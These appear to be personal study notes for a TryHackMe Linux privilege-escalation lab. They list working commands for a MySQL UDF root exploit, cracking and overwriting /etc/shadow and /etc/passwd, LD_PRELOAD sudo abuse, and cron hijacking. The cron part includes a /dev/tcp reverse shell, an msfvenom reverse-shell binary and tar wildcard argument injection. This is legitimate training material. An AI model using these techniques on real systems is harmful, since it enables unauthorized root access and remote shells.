# TryHackMe Linux PrivEsc Room
#TryHackMe #Privesc #Linux

1.  Service exploits

If mysql is running as root and the root user *does not have a password*, then we can take advantage of **User Defined Functions (UDF´S)** to run system commands as root via MySQL service.

`cd /home/user/tools/mysql-udf`

Compile raptor_udfc2.c exploit using the following:

`gcc -g -c raptor_udf2.c -fPIC`

`gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so 
raptor_udf2.o -lc`

Now we just need to run MySQL

`MySQL -u root`

Execute these commands on MySQL to create an **UDF** "do_system" using the compiled exploit (don´t forget to change load file path for the path of the actual exploit )

```use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';`
Use function to copy /bin/bash to /tmp/rootbash and set SUID perms.

`select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`
```
Exit out of MySQL and run

`/tmp/rootbash`

I should have a shell by now

Remove executable by typping

`rm /tmp/rootbash`

`exit`

2. Weak file permissions
	- Readable /etc/shadow
	
		Check the permissions for shadow file
		
		`ls -l /etc/shadow`
		
		Read shadow file
		
		`cat /etc/shadow`
		
		Copy root user hash (**SHA512 CRYPT**) and decrypt it with john
		
		`john hash.txt`
		
		Switch to root user and use decrypted password
		
		`su root`
		
	- Writable /etc/shadow
	
		Check the permissions for shadow file
		
		`ls -l /etc/shadow`
		
		Generate new password of choice and replace the root hash with the new one
		
		`makepasswd -m sha-512 newpass`
		
		Login in with the new password
		
		`su root`
		
	- Writable 	/etc/passwd
	
		Check if passwd file is writable
		
		`ls -l /etc/passwd`
		
		Generate new password with hash
		
		`openssl passwd newpasswordhere`
		
		Edit the /etc/passwd file with the generated password hash
		
		Switch to the root user using the new password
		
		`su root`
		
		You can always copy and paste the root user´s row and paste it on the bottom of the file changing the username
		
		`su newroot`
3. SUDO
	- Shell escape sequencies
	
		List programs which sudo is allowed to run
		
		`sudo -l`
		
		Got to https://gtfobins.github.io and search for some of the program names, if any program is listed as sudo then you can use it to elevate your privileges
		
		How many programs is "user" allowed to run via sudo?
		
		*11*
		One program on the list doesn't have a shell escape sequence on GTFOBins. 
		
		Which is it?
		
		*Apache2*
	- Environment Variables
	
		Check which encironment variables are inherited (look for env_keep options):
		
		`sudo -l`
		
		LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.
		
		Create a shared object using the code located at /home/user/tools/sudo/preload.c:
		
		`gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c`
		
		Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object:
		
		`sudo LD_PRELOAD=/tmp/preload.so program-name-here`
		
		Root shell should spawn

3. Cron Jobs
	- File permissions
	
		View content of system-wide crontab:
		
		`cat /etc/crontab`
		
		Two cron jobs scheduled to run everyminute, one runs overwrite.sh the other compress.sh
		
		`locate overwrite.sh`
		
		Check if file is world writable
		
		`ls -l /usr/local/bin/overwrite.sh`
		
		Replace contents of file with this
		
		```#!/bin/bash
		bash -i >& /dev/tcp/YOUR_IP_HERE/PORT_HERE 0>&1
		```
		
		Finally set up a netcat listener 
		
		`nc -nvlp 4444`
	- Path Environment Variable
	
		View contents of system-wide crontab:
		
		`cat /etc/crontab`
		PATH variable starts with /home/user which is the users home directory
		
		Create a file called overwrite.sh in the home directory
		
		`nano overwrite.sh`
		
		Paste this into the file
		
		```#!/bin/bash
		cp /bin/bash /tmp/rootbash
		chmod +xs /tmp/rootbash
		```
		
		Make the file executable 
		
		`chmod +x /home/user/overwrite.sh`
		
		Wait for cron job to run, run this command to get a shell with root privileges
		
		`tmp/rootbash -p`
		
		Remove the modified code
		
		`rm /tmp/rootbash`
		
		`exit`
	- Wildcards
	
		View content of cron job script
		
		`cat /usr/local/bin/compress.sh`
		
		Note that tar command is being running with the wildcard () in the home 
		directory. 
		
		Take a look at https://gtfobins.github.io/ for the tar command
		
		Use msfvenom on kali box to generate reverse shell ELF binary
		
		`msfvenom -p linux/x64/shell_reverse_tcp LHOST=YOUR_IP_HERE LPORT=4444 -f elf -o shell.elf`
		
		Transfer shell.elf file to debian machine
		
		`python3 -m http.server -b MACHINE_IP_HERE`
		`wget MACHINE_IP:8000/FULL_PATH`
		
		Make the file executible
		
		`chmod +x /home/user/shell.elf`
		
		Create two files in /home/user:
		
		`touch /home/user/--checkpoint=1
		
		touch /home/user/--checkpoint-action=exec=shell.elf`
		
		Setup a netcat listener
		
		`nc -nvlp 4444`
		
		Exit out the root shell and delete files
		
		```rm /home/user/shell.elf
		rm /home/user/--checkpoint=1
		rm /home/user/--checkpoint-action=exec=shell.elf
		```